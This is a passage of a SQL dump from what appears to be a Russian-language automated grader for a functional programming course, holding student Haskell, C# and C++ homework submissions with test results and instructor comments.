(755, 36, '397095', '2012-09-20 18:58:37', 1, 'cubeTable n = zip [1..n] (map (x->x^3) [1..n])', '<br/>Тесты успешно пройдены!'),
(756, 35, 'Deutsche', '2012-09-20 19:06:27', 1, 'isosc (x1, y1) (x2, y2) (x3, y3) = if ((x1-x2)^2+(y1-y2)^2 == (x1-x3)^2+(y1-y3)^2) || ((x1-x2)^2+(y1-y2)^2 == (x2-x3)^2+(y2-y3)^2) || ((x1-x3)^2+(y1-y3)^2 == (x2-x3)^2+(y2-y3)^2)\r\n					then True else False', '<br/>Тесты успешно пройдены!'),
(757, 38, '397095', '2012-09-20 19:09:28', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight t = h t (-1)\r\n\r\nh Empty s = s\r\nh (Node _ l r) s = max (h l (s+1)) (h r (s+1))', '<br/>Тесты успешно пройдены!'),
(758, 40, '397095', '2012-09-20 19:13:15', 1, 'frame n = map (x -> if x == 1 || x == n then bold n else bound n) [1..n]\r\nbold n = map (x->1) [1..n]\r\nbound n = map (x -> if x == 1 || x == n then 1 else 0) [1..n]', '<br/>Тесты успешно пройдены!'),
(759, 41, '397095', '2012-09-20 19:17:17', 1, 'countOdd xs = foldr (x r -> if mod x 2 == 0 then r else r + 1) 0 xs\r\n   --- Просто как замечание, из-за частичной параметризации  можно написать\r\n   --- countOdd = foldr (x r -> if mod x 2 == 0 then r else r + 1) 0\r\ncountOdd1 xs = sum (map (x -> mod x 2) xs)\r\n    --- А тут можно, просто как вариант, использовать композицию', '<br/>Тесты успешно пройдены!'),
(760, 42, '397095', '2012-09-20 19:22:09', 1, 'myfoldl f e (x:xs) = myfoldl f (e `f` x) xs\r\nmyfoldl _ e [] = e', '<br/>Тесты успешно пройдены!'),
(761, 36, 'Deutsche', '2012-09-20 19:29:34', 0, 'cubeTable n = zip [1..n] [map (x -> x^3) [1..n]]', 'Выражение имеет неправильное значение: cubeTable 4'),
(762, 37, '397095', '2012-09-20 19:30:59', 1, 'minsum (x:xs) = snd (foldl (f) (x, x + head xs) xs)\r\nf (y,r) x = if (x + y) < r then (x,x+y) else (x,r)', '<br/>Тесты успешно пройдены!'),
(763, 36, 'Deutsche', '2012-09-20 19:36:20', 1, 'cubeTable n = zip [1..n] (map (x -> x^3) [1..n])', '<br/>Тесты успешно пройдены!'),
(764, 37, 'Deutsche', '2012-09-20 19:49:36', 1, 'minsum [] = 0\r\nminsum(x:[]) = x\r\nminsum s = \r\n	let\r\n		s1 = 0:s\r\n		s2 = s ++ [0]\r\n		s3 = zipWith (+) s1 s2\r\n		s4 = take ((length s3)-1) s3\r\n		s5 = drop 1 s4\r\n	in foldr min (1/0) s5', '<br/>Тесты успешно пройдены!'),
(765, 33, '397095', '2012-09-20 19:54:54', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Integral\r\n	{\r\n		static double integrate(Func<double, double> f, double a, double b, int steps)\r\n		{\r\n			double delta = (b - a) / steps;\r\n			double sum = 0;\r\n			for (int i = 0; i < steps; i++)\r\n			{\r\n				double x = a + i * delta;\r\n				double v = (f(x) + f(x + delta)) / 2;\r\n   --- ОК, но лучше тут немного изменить, чтобы вы каждой точке f вызывалась один раз.\r\n   --- Ведь f может быть очень сложной функцией и экономия может быть существенной\r\n				sum += v * delta;\r\n			}\r\n			return sum;\r\n		}\r\n\r\n		static void Main(string[] args) \r\n		{\r\n			Console.WriteLine("f(x) = Sin(x); [0, PI] = {0}", integrate(x => Math.Sin(x), 0, Math.PI, 100000));\r\n			Console.WriteLine("f(x) = x^2;    [-1, 1] = {0}", integrate(x => x * x, -1, 1, 100000));\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(766, 34, '397095', '2012-09-20 19:55:12', 1, '#include <stdio.h>\r\n\r\nusing namespace std;\r\n\r\ntemplate <class F>\r\ndouble integrate(F f, double a, double b, int steps) {\r\n	const double delta = (b - a) / steps;\r\n	double sum = 0;\r\n	for (int i = 0; i < steps; i++) {\r\n		double x = a + i * delta;\r\n		double v = (f(x) + f(x + delta)) / 2;\r\n		sum += v * delta;\r\n	}\r\n}\r\n\r\nint main() {\r\n	auto func = [] (double x) { return x * x; };\r\n	printf("f(x) = x^2; [-1, 1] = %f", integrate(func, -1, 1, 100000));\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(767, 38, 'Deutsche', '2012-09-20 20:00:52', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nheight Empty = 0\r\nheight (Node x Empty Empty) = 0\r\nheight (Node x l r) = 1 + max (height l) (height r)', '<br/>Тесты успешно пройдены!'),
(768, 35, 'B@rmaley.exe', '2012-09-20 20:05:04', 0, 'import Data.List\r\n\r\nisocs a b c = all (>0) edges && (edges !! 0 == edges !! 1 || edges !! 1 == edges !! 2) && (head edges < sum (tail edges))\r\n              where edges = reverse $ sort [dist a b, dist a c, dist b c]\r\n                    dist p1 p2 = sqrt $ (fst p1 - fst p2)^2 + (snd p1 - snd p2)^2', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(769, 35, 'B@rmaley.exe', '2012-09-20 20:07:53', 1, 'isocs a b c = all (>0) [e1, e2, e3] && (e1 == e2 || e2 == e3 || e1 == e3) && e1 < e2 + e3 && e2 < e1 + e3 && e3 < e1 + e3\r\n   --- Неравенства треугольника - это видимо избыточные проверки. Для невырожденного треугольника они всегда выполняются, а то, что он невырожденный, вы уже проверили.\r\n              where e1 = dist a b\r\n                    e2 = dist a c\r\n                    e3 = dist b c \r\n                    dist p1 p2 = sqrt $ (fst p1 - fst p2)^2 + (snd p1 - snd p2)^2\r\n', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(770, 39, 'Deutsche', '2012-09-20 20:18:59', 2, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight Empty = 0\r\nminHeight (Node x Empty Empty) = 0\r\nminHeight (Node x l r) = minHeight1 (Node x l r) 1\r\nminHeight1 (Node x l r) h = h + min (minHeight l) (minHeight r)\r\n   --- Это, конечно, правильно, но тут не реализована оптимизация, о которой мы говорили на занятии..\r\n   --- Т.е. не выполнено дополнительное условие', '<br/>Тесты успешно пройдены!'),
(771, 36, 'B@rmaley.exe', '2012-09-20 20:23:12', 1, 'cubeTable n = map (k -> (k, k^3)) [1..n]', '<br/>Тесты успешно пройдены!'),
(772, 37, 'B@rmaley.exe', '2012-09-20 20:25:05', 1, 'minsum xs = minimum $ zipWith (a b -> a+b) xs $ tail xs', '<br/>Тесты успешно пройдены!'),
(773, 41, 'Deutsche', '2012-09-20 20:39:39', 1, 'countOdd s = foldr (x res -> if ((x `mod` 2) == 1) then res+1 else res) 0 s\r\ncountOdd1 s = length (filter odd s)\r\n  --- Или немного короче\r\n  --- countOdd = foldr (x res -> if ((x `mod` 2) == 1) then res+1 else res) 0\r\n  --- countOdd1 = length . filter odd\r\n', '<br/>Тесты успешно пройдены!'),
(774, 42, 'Deutsche', '2012-09-20 21:01:54', 1, 'myfoldl _ e [] = e\r\nmyfoldl f e (x:s) = myfoldl f (f e x) s', '<br/>Тесты успешно пройдены!'),
(775, 36, '374969', '2012-09-20 21:07:25', 1, 'cubeTable n = [(i,i*i*i)|i <- [1..n]]\r\n', '<br/>Тесты успешно пройдены!'),
(776, 38, '374969', '2012-09-20 21:39:55', 0, 'height Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ tree1 tree2) = 1 + max (height tree1) (height tree2)\r\n', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(777, 38, '374969', '2012-09-20 21:56:49', 2, 'height Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ tree1 tree2) = 1 + max (height tree1) (height tree2)\r\n   --- Не совсем то. Во первых, тут надо в начале написать определение типа, как на занятии.\r\n   --- (из за этого у вас синтаксическая ошибка)\r\n   --- Во вторых, у вас будет ошибка, например, при вызове height (Node 1 Empty (Node 2 Empty Empty))\r\n   --- При первом рекурсивном вызове вызовется height Empty, а у вас для этого нет правила.\r\n   --- Попробуйте исправить, пожалуйста.  ', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(778, 36, 'erwert', '2012-09-21 01:23:45', 1, 'cubeTable x = [(t,t^3) | t <- [1..x]]', '<br/>Тесты успешно пройдены!'),
(779, 37, 'erwert', '2012-09-21 01:40:40', 1, 'minsum (x:y:xs) = foldl min (x + y) [ a + b | (a,b) <- zip (y:xs) xs]', '<br/>Тесты успешно пройдены!'),
(780, 42, 'erwert', '2012-09-21 02:03:02', 0, 'myfoldl cond q [] = 0\r\nmyfoldl cond q (x:xs) = cond q x + myfold cond q xs', 'Не удалось вычислить выражение "myfoldl (+) 0 [1,2,3]", проверьте правильность синтаксиса'),
(781, 42, 'erwert', '2012-09-21 02:03:42', 0, 'myfoldl cond q [] = 0\r\nmyfoldl cond q (x:xs) = cond q x + myfoldl cond q xs', 'Выражение имеет неправильное значение: myfoldl (+) 10 []'),
(782, 42, 'erwert', '2012-09-21 02:04:23', 0, 'myfoldl cond q [] = q\r\nmyfoldl cond q (x:xs) = cond q x + myfoldl cond q xs', 'Выражение имеет неправильное значение: myfoldl (^) 2 [3]'),
(783, 42, 'erwert', '2012-09-21 02:07:24', 0, 'myfoldl cond q [] = q\r\nmyfoldl cond q (x:xs) = if xs /= [] then cond q x + myfoldl cond q xs else cond q x', '<br/>Тесты успешно пройдены!'),
(784, 42, 'erwert', '2012-09-21 02:09:13', 2, 'myfoldl cond q [] = q\r\nmyfoldl cond q [x] = cond q x\r\nmyfoldl cond q (x:y:xs) = cond q x + myfoldl cond q xs\r\n   --- почему же тут сумма? Мы соединяем элементы списка по разному - иногда *, иногда &&, иногда еще чем-то, и это как раз задается во первом параметре. Попробуйте пожалуйста тут вместо суммы использовать то, что у вас называется cond', 'Выражение имеет неправильное значение: myfoldl (+) 0 [1,2,3]'),
(785, 33, 'tonyo', '2012-09-21 07:21:18', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace Integral\r\n\r\n{\r\n\r\n    class Integral\r\n\r\n    {\r\n\r\n        const int N = 1000;\r\n\r\n\r\n\r\n        static double integral(Func<double, double> f, double a, double b)\r\n\r\n        {\r\n\r\n            double res = 0;\r\n\r\n            bool changeSign = false;\r\n\r\n            if (a > b)\r\n\r\n            {\r\n\r\n                double t = a;\r\n\r\n                a = b;\r\n\r\n                b = t;\r\n\r\n                changeSign = true;\r\n\r\n            }\r\n\r\n            double dx = (b - a)/N;\r\n\r\n            double xn = a;\r\n\r\n            double xn1 = a + dx;\r\n\r\n            for (int i = 0; i <= N; i++)\r\n\r\n            {\r\n\r\n                res += 1.0 / 2 * dx * (f(xn) + f(xn1));\r\n\r\n                xn += dx;\r\n\r\n                xn1 += dx;\r\n\r\n            }\r\n\r\n            return changeSign ? -res : res;\r\n\r\n        }\r\n\r\n\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n\r\n\r\n        static double cube(double i)\r\n\r\n        {\r\n\r\n            return i * i * i;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            double res = 0;\r\n\r\n\r\n\r\n            res = integral(sqr, 0, -1);\r\n\r\n            Console.WriteLine("{0}", res);\r\n\r\n            res = integral(cube, 0, -1);\r\n\r\n            Console.WriteLine("{0}", res);\r\n\r\n            \r\n\r\n            res = integral(i => i * i, -2, 2);\r\n\r\n            Console.WriteLine("{0}", res);\r\n\r\n            res = integral(i => i * i * i, 0, -2);\r\n\r\n            Console.WriteLine("{0}", res);\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(786, 35, 'tonyo', '2012-09-21 07:53:44', 1, 'isosc (x1, y1) (x2, y2) (x3, y3) = isosc1 (Pt x1 y1) (Pt x2 y2) (Pt x3 y3)\r\n\r\ndata Point = Pt Integer Integer\r\nisosc1 pt1 pt2 pt3 = not $ allDifferent [distsqr pt1 pt2, distsqr pt2 pt3, distsqr pt3 pt1]\r\n   --- OK, очень хорошо, замечательное решение, но я не оченб понял, зачем вы вводите Point и isosc1\r\n   --- Вполне можно было distsqr написать прямо для пар\r\n\r\ndistsqr (Pt x1 y1) (Pt x2 y2) = (x1-y1)^2 + (x2-y2)^2\r\n\r\nallDifferent [x] = True\r\nallDifferent (x:xs) = all (x /=) xs && allDifferent xs\r\n', '<br/>Тесты успешно пройдены!'),
(787, 36, 'tonyo', '2012-09-21 07:56:15', 1, 'cubeTable n = map (x -> (x, x^3)) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(788, 35, '1384577', '2012-09-21 08:23:34', 1, 's1(x1,y1)(x2,y2)(x3,y3) = (x1-(x3+x2)/2)*(x3-x2)+(y1-(y3+y2)/2)*(y3-y2)\r\ns2(x1,y1)(x2,y2)(x3,y3) = (x2-(x1+x3)/2)*(x1-x3)+(y2-(y1+y3)/2)*(y1-y3)\r\ns3(x1,y1)(x2,y2)(x3,y3) = (x3-(x1+x2)/2)*(x2-x1)+(y3-(y1+y2)/2)*(y2-y1)\r\n\r\nisosc(x1,y1)(x2,y2)(x3,y3) = s1(x1,y1)(x2,y2)(x3,y3)==0 || s2(x1,y1)(x2,y2)(x3,y3)==0 || s3(x1,y1)(x2,y2)(x3,y3)==0\r\n   --- OK, но зачем три функции??? Можно же было\r\n   --- isosc(x1,y1)(x2,y2)(x3,y3) = s1(x1,y1)(x2,y2)(x3,y3)==0 || s1(x2,y2)(x1,y1)(x3,y3)==0 \r\n   ---      || s3(x3,y3)(x1,y1)(x2,y2)==0\r\n   --- А можно еще немного короче, но это бы обсудим на занятии\r\n', '<br/>Тесты успешно пройдены!'),
(789, 36, '1384577', '2012-09-21 08:29:01', 1, 'cubeTable n = map (x -> (x,x*x*x)) [1,2..n]', '<br/>Тесты успешно пройдены!'),
(790, 42, 'tonyo', '2012-09-21 08:29:41', 1, 'myfoldl f res [] = res\r\nmyfoldl f res (x:xs) = myfoldl f (f res x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(791, 40, 'tonyo', '2012-09-21 09:10:03', 1, 'full n x = take n [x,x..]\r\nborders n = [1] ++ (full (n-2) 0) ++ [1]\r\nframe n = [full n 1] ++ map (x -> borders n) [1..(n-2)] ++ [full n 1]\r\n', '<br/>Тесты успешно пройдены!'),
(792, 22, '1384577', '2012-09-21 09:35:05', 0, 'goldbach a | rem a 2 == 1 = filter ((x,y) -> isPrime x && isPrime y) [(2,a-2)]\r\n      | otherwise = [head $\r\n		filter ((x,y) -> isPrime x && isPrime y) $ \r\n			map (e -> (e, a - e)) [1,3..a `div` 2]]\r\n where\r\n factors a = filter (isFactor a) [2..a-1]\r\n isFactor a b = a `mod` b == 0\r\n isPrime a = null $ factors a\r\n\r\ng a = not (null (goldbach a))', 'Выражение имеет неправильное значение: g 6'),
(793, 22, '1384577', '2012-09-21 09:46:27', 0, 'goldbach a | rem a 2 == 1 = filter ((x,y) -> isPrime x && isPrime y && x/=y) [(2,a-2)]\r\n      | otherwise = filter ((x,y) -> isPrime x && isPrime y && x/=y) $ \r\n			map (e -> (e, a - e)) [3,5..a `div` 2]\r\n where\r\n factors a = filter (isFactor a) [2..a-1]\r\n isFactor a b = a `mod` b == 0\r\n isPrime a = null $ factors a\r\n\r\ng a = not (null (goldbach a))', 'Хитрый тест номер 4 не пройден :(<br/>Подсказка: 1 - это не простое число'),
(794, 22, '1384577', '2012-09-21 10:01:57', 1, 'goldbach a | a == 3 = []\r\n		| rem a 2 == 1 = filter ((x,y) -> isPrime x && isPrime y && x/=y) [(2,a-2)]\r\n   --- Вот тут что-то слишком сложно! Если a нечетное, то x или у точно четные - а вы много знаете простых четных чисел?? ))\r\n      			| otherwise = filter ((x,y) -> isPrime x && isPrime y && x/=y) $ \r\n					map (e -> (e, a - e)) [3,5..a `div` 2]\r\n where\r\n factors a = filter (isFactor a) [2..a-1]\r\n    --- В приниципе здесь достаточно искать до sqrt a\r\n isFactor a b = a `mod` b == 0\r\n isPrime a = null $ factors a\r\n\r\ng a = not (null (goldbach a))', '<br/>Тесты успешно пройдены!'),
(795, 34, 'B@rmaley.exe', '2012-09-21 10:53:11', 1, '#include <functional>\r\n#include <cmath>\r\n#include <iostream>\r\n\r\ndouble integrate(const std::function<double(double)> &f, double a, double b) {\r\n        double value = 0,\r\n                step = 1e-3;\r\n\r\n        while (a < b) {\r\n                double c = a + step;\r\n                value += f((a+c) / 2) * step;\r\n                a = c;\r\n        }\r\n\r\n        return value;\r\n}\r\n\r\nint main() {\r\n        double area = integrate([] (double x) { return cos(x); }, 0, M_PI / 2);\r\n        std::cout << "Area below cos(x) from 0 to PI/2 is " << area << std::endl;\r\n        return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(796, 41, 'B@rmaley.exe', '2012-09-21 10:59:12', 1, 'countOdd = foldr (e acc -> if e `mod` 2 == 1 then 1+acc else acc) 0\r\n   --- Ну или, просто как вариант, e acc -> acc + e `mod` 2\r\n\r\ncountOdd1 = length . filter ((==1) . (`mod` 2))', '<br/>Тесты успешно пройдены!'),
(797, 40, '1384577', '2012-09-21 11:03:35', 1, 'frame 0 = [[]]\r\nframe 1 = [[1]]\r\nframe n = [take n [1,1..]] ++ replicate (n-2) ([1] ++ take (n-2) [0,0..] ++ [1]) ++ [take n [1,1..]]\r\n', '<br/>Тесты успешно пройдены!'),
(798, 42, '374969', '2012-09-21 11:03:36', 1, 'myfoldl op state [] = state\r\nmyfoldl op state (hd:tl) = myfoldl op (op state hd) tl\r\n', '<br/>Тесты успешно пройдены!'),
(799, 40, 'B@rmaley.exe', '2012-09-21 11:05:24', 1, 'frame n = a : foldr (\\_ acc -> b : acc) [a] xs\r\n          where a = take n $ repeat 1\r\n                b = 1 : foldr (\\_ acc -> 0:acc) [1] xs\r\n                xs = [1..n-2]', '<br/>Тесты успешно пройдены!'),
(800, 42, 'B@rmaley.exe', '2012-09-21 11:09:49', 1, 'myfoldl f acc [] = acc\r\nmyfoldl f acc (x:xs) = myfoldl f (f acc x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(801, 35, 'tonyo', '2012-09-21 11:48:23', 1, 'isosc (x1, y1) (x2, y2) (x3, y3) = isosc1 (Pt x1 y1) (Pt x2 y2) (Pt x3 y3)\r\n\r\ndata Point = Pt Integer Integer\r\nisosc1 pt1 pt2 pt3 = not $ allDifferent [distsqr pt1 pt2, distsqr pt2 pt3, distsqr pt3 pt1]\r\n   --- OK, очень хорошо, замечательное решение, но я не оченб понял, зачем вы вводите Point и isosc1\r\n   --- Вполне можно было distsqr написать прямо для пар\r\n\r\n   --- UPD: да, конечно, можно было и для пар, просто хотелось опробовать определение своих типов.\r\n   --- OK, все ясно)\r\n\r\ndistsqr (Pt x1 y1) (Pt x2 y2) = (x1-y1)^2 + (x2-y2)^2\r\n\r\nallDifferent [x] = True\r\nallDifferent (x:xs) = all (x /=) xs && allDifferent xs', '<br/>Тесты успешно пройдены!'),
(802, 37, 'tonyo', '2012-09-21 12:06:36', 1, 'minsum list = minimum $ map (x -> fst x + snd x) $ zip list (tail list)\r\n', '<br/>Тесты успешно пройдены!'),
(803, 42, '1384577', '2012-09-21 12:15:06', 1, 'myfoldl _ p []     = p\r\nmyfoldl f p (x:xs) = myfoldl f (f p x) xs', '<br/>Тесты успешно пройдены!'),
(804, 23, '517309', '2012-09-21 12:47:03', 0, 'с n = gc  (reverse(f n 1 [])) n 0 1 1 0 \r\n\r\ngc (x:y:xs) n s p f r  \r\n                      | a==n && f==1 = gc cs n 0 1 1 (r+1)\r\n                      | a==n && f==0 = gc cs n 0 1 1 r\r\n                      | p/=0 && fg==1 = gc cs n a b 1 r\r\n                      | p==0 || fg/=1 = gc cs n a 0 0 r\r\n                      where \r\n                         a=s+x\r\n                         b=p*x\r\n                         cs=y:xs\r\n                         fg = g b y\r\n\r\ngc (x:xs) n s p f r  | s+x==n && f==1 = r+1\r\n                     | otherwise = r\r\n\r\nf d i xs     | d>i = f d b xs ++ f (d-i) b as\r\n             | i==d = as\r\n             | i>d  = []\r\n             where \r\n                as=i:xs\r\n                b=i+1\r\n                \r\ng a 0 = a\r\ng a b = g b (a `mod` b)\r\n', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(805, 23, '517309', '2012-09-21 12:48:51', 3, 'c n = gc  (reverse(f n 1 [])) n 0 1 1 0 \r\n\r\ngc (x:y:xs) n s p f r\r\n                      | a==n && f==1 = gc cs n 0 1 1 (r+1)\r\n\r\n                      | a==n && f==0 = gc cs n 0 1 1 r\r\n\r\n                      | p/=0 && fg==1 = gc cs n a b 1 r\r\n\r\n                      | p==0 || fg/=1 = gc cs n a 0 0 r\r\n\r\n                      where \r\n\r\n                         a=s+x\r\n\r\n                         b=p*x\r\n\r\n                         cs=y:xs\r\n\r\n                         fg = g b y\r\n\r\n\r\ngc (x:xs) n s p f r  | s+x==n && f==1 = r+1\r\n\r\n                     | otherwise = r\r\n\r\n\r\nf d i xs     | d>i = f d b xs ++ f (d-i) b as\r\n\r\n             | i==d = as\r\n\r\n             | i>d  = []\r\n\r\n             where \r\n\r\n                as=i:xs\r\n\r\n                b=i+1\r\n\r\n                \r\ng a 0 = a\r\n\r\ng a b = g b (a `mod` b)\r\n', '<br/>Тесты успешно пройдены!'),
(806, 41, '1384577', '2012-09-21 13:15:18', 1, 'countOdd xs = foldl (acc x -> acc + (rem x 2)) 0 xs\r\ncountOdd1 xs = length ( filter (x -> rem x 2 == 1) xs)\r\n', '<br/>Тесты успешно пройдены!'),
(807, 35, '6774563', '2012-09-21 13:49:33', 1, 'isosc (a1,a2) (b1,b2) (c1,c2) = ab == ac || ab == bc || bc == ac where\r\n	ab = dist (a1,a2) (b1,b2)\r\n	ac = dist (a1,a2) (c1,c2)\r\n	bc = dist (b1,b2) (c1,c2)\r\n   --- Тут, на самом деле, можно написать немного короче, это мы обсудим в следующий раз.\r\n\r\ndist (a1,a2) (b1,b2) = sqr(a1-b1) + sqr(a2-b2)\r\n\r\nsqr a = a*a\r\n', '<br/>Тесты успешно пройдены!'),
(808, 36, '6774563', '2012-09-21 13:50:01', 1, 'cubeTable n = zip [1..n] (map (^3) [1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(809, 37, '6774563', '2012-09-21 13:50:32', 0, 'minsum [] = 0\r\nminsum [x] = x\r\nminsum (x:xs) = foldr min maxint (map ((a,b) -> a+b) (zip (x:xs) xs))\r\n', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(810, 37, '6774563', '2012-09-21 13:51:31', 1, 'maxint = 2000000000\r\n\r\nminsum [] = 0\r\nminsum [x] = x\r\nminsum (x:xs) = foldr min maxint (map ((a,b) -> a+b) (zip (x:xs) xs))\r\n', '<br/>Тесты успешно пройдены!'),
(811, 38, '6774563', '2012-09-21 13:52:00', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nheight Empty = 0\r\nheight t = nodes t - 1\r\n\r\nnodes Empty = 0\r\nnodes (Node key left right) = 1 + max (nodes left) (nodes right)\r\n', '<br/>Тесты успешно пройдены!'),
(812, 39, '6774563', '2012-09-21 13:52:27', 2, '-- На самом деле есть идея идти в ширину (по "рядам"). Так быстрее,\r\n-- но нужна очередь, как реализовать нормально списками которую у меня нет идей\r\n\r\ndata Tree = Node Integer Tree Tree | Empty\r\n\r\nminHeight Empty = 0\r\nminHeight t = minNodes t - 1\r\n\r\nminNodes Empty = 0\r\nminNodes (Node key left right) = do\r\n	let leftHeight = minNodes left\r\n	if leftHeight > 1 then 1 + (min leftHeight (minNodes right)) else 1 + leftHeight\r\n\r\n   --- Тут на самом деле не совсем правильно. Например,\r\n   ---    minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))\r\n   --- у вас дает 1, а дб 2 (я сейчас добавил такой тест)\r\n   --- И потом, честно говоря, я не очень вижу, где у вас оптимизация.. Там де идея в том, что, если мы слева\r\n   --- нашли какую-то вершину, на расстоянии, скажем, 5, то потом надо при обходе правого поддерева\r\n   --- не заходить глубже 4, там мы все равно ничего не найдем.. Но для жтого надо это 5 передать в функцию\r\n   --- обхода, без этого вроде никак..\r\n   --- Насчет обхода в ширину - ну, смотрите, если хотите, сделайте так, с помощью ++ [x] (те доьавляейе в конец \r\n   --- списка, а береите естественно с начала. Это получится не очегь эффективно, но ОК, это я зачту.', '<br/>Тесты успешно пройдены!'),
(813, 40, '6774563', '2012-09-21 13:52:51', 1, 'frame n = borderedList n (listof 1 n) (borderedList n 1 0)\r\n\r\nborderedList n edgeVal midVal = [if x == 1 || x == n then edgeVal else midVal | x <- [1..n]]\r\n\r\nlistof value count = [value | x <- [1..count]]\r\n', '<br/>Тесты успешно пройдены!'),
(814, 41, '6774563', '2012-09-21 13:53:20', 1, 'countOdd xs = foldr incOdd 0 xs\r\n\r\ncountOdd1 xs = length (filter (x -> x `mod` 2 == 1) xs)\r\n\r\nincOdd elem count | elem `mod` 2 == 1 = count + 1\r\n		  | True              = count\r\n   ---- или как вариант, ... = count + elem `mod` 2', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(815, 42, '6774563', '2012-09-21 13:53:46', 2, 'myfoldl exp init [] = init\r\nmyfoldl exp init (x:xs) = exp (myfoldl exp init xs) x\r\n  --- Нет, это не совсем правильно, вот например:\r\n  --- let f x y = 2*x+y in myfoldl f 2 [3,5]\r\n  ---   у вас возвращает 21. А надо 19 - вы можете это проверить, вызвав\r\n  --- let f x y = 2*x+y in (2 `f` 3) `f` 5\r\n  --- Такого теста не было, но я его сейчас добавил. Прпробуйте исправить, пожалуйста?', '<br/>Тесты успешно пройдены!'),
(816, 33, '6774563', '2012-09-21 14:16:55', 1, 'using System;\r\n\r\nnamespace task_5_1\r\n{\r\n    internal static class Program\r\n    {\r\n        public static double Integral(Func<double, double> f, double a, double b)\r\n        {\r\n            const int divCount = 10000;\r\n            double step = (b - a)/divCount;\r\n            double curPoint = a;\r\n            double result = 0;\r\n            for (int i = 0; i < divCount; ++i)\r\n            {\r\n                result += step*(f(curPoint) + f(curPoint + step))/2;\r\n                curPoint += step;\r\n            }\r\n            return result;\r\n        }\r\n\r\n        public static void Main()\r\n        {\r\n            Console.WriteLine(Integral(x => x*x, 0, 1));\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(817, 42, '517309', '2012-09-21 14:24:18', 0, 'myfoldl = foldl', 'Не удалось вычислить выражение "myfoldl f 2 [3,5] where f x y = 2*x+y", проверьте правильность синтаксиса'),
(818, 42, '517309', '2012-09-21 14:28:49', 3, 'myfoldl = foldl', '<br/>Тесты успешно пройдены!'),
(819, 34, '6774563', '2012-09-21 14:44:04', 1, '#include "stdafx.h"\r\n\r\ntemplate<typename F>\r\ndouble integral(F &f, double a, double b) {\r\n	double const divCount = 10000;\r\n	double step = (b-a) / divCount;\r\n	double curPoint = 0;\r\n	double result = 0;\r\n	for (int i = 0; i < divCount; ++i) {\r\n		result += step * (f(curPoint) + f (curPoint + step)) / 2;\r\n		curPoint += step;\r\n	}\r\n	return result;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[]) {\r\n	printf("%f", integral([](double x) { return x*x; }, 0, 1));\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(820, 42, '6774563', '2012-09-21 15:06:06', 1, 'myfoldl exp init [] = init\r\nmyfoldl exp init (x:xs) = myfoldl exp (exp init x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(821, 39, 'Deutsche', '2012-09-21 15:42:55', 0, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight Empty = 0\r\nminHeight (Node x Empty Empty) = 0\r\nminHeight (Node x l r) = minHeight1 (Node x l r) 0 (1/0)\r\nminHeight1 Empty h res = if (h<res) \r\n				then h \r\n			 else res\r\nminHeight1 (Node x Empty Empty) h res = if (h<res) \r\n						then h \r\n					else res\r\nminHeight1 (Node x l r) h res = if (h<res) \r\n					then min (minHeight1 l (h+1) res) (minHeight1 r (h+1) res)\r\n				else res\r\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(822, 42, '517309', '2012-09-21 15:47:35', 3, 'mi Empty = 1000\r\nmi (Node _ Empty Empty) = 0\r\nmi (Node _ l r) = 1 + min (mi l) (mi r) \r\n\r\nminHeight = mi', 'Не удалось вычислить выражение "myfoldl (+) 0 [1,2,3]", проверьте правильность синтаксиса'),
(823, 39, '517309', '2012-09-21 15:48:29', 0, 'mi Empty = 1000\r\nmi (Node _ Empty Empty) = 0\r\nmi (Node _ l r) = 1 + min (mi l) (mi r) \r\n\r\nminHeight = mi', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(824, 39, '517309', '2012-09-21 15:49:14', 0, 'mi Empty = 1000\r\nmi (Node _ Empty Empty) = 0\r\nmi (Node _ l r) = 1 + min (mi l) (mi r) \r\n\r\nminHeight x = mi x', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
